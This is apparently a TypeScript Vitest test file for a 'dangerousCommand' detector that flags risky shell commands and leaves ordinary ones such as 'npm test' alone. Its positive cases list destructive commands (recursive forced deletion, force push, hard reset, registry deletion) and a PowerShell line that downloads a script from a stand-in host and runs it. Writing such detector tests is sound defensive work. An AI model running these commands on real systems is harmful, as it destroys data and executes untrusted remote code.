import { describe, expect, it } from 'vitest';
import { dangerousCommand } from './danger';

describe('dangerousCommand', () => {
  it('flags destructive and remote-code commands', () => {
    expect(dangerousCommand('Remove-Item -Recurse -Force .\\build')).toHaveLength(1);
    expect(dangerousCommand('rm -rf node_modules')).toHaveLength(1);
    expect(dangerousCommand('git push --force origin main')).toHaveLength(1);
    expect(dangerousCommand('git reset --hard HEAD~3')).toHaveLength(1);
    expect(dangerousCommand('irm https://x.example/i.ps1 | iex').length).toBeGreaterThan(0);
    expect(dangerousCommand('reg delete HKCU\\Software\\X /f')).toHaveLength(1);
  });

  it('leaves ordinary commands alone', () => {
    expect(dangerousCommand('npm test')).toEqual([]);
    expect(dangerousCommand('git status')).toEqual([]);
    expect(dangerousCommand('git push origin main')).toEqual([]);
    expect(dangerousCommand('Get-ChildItem -Recurse')).toEqual([]);
    expect(dangerousCommand('python main.py')).toEqual([]);
  });
});
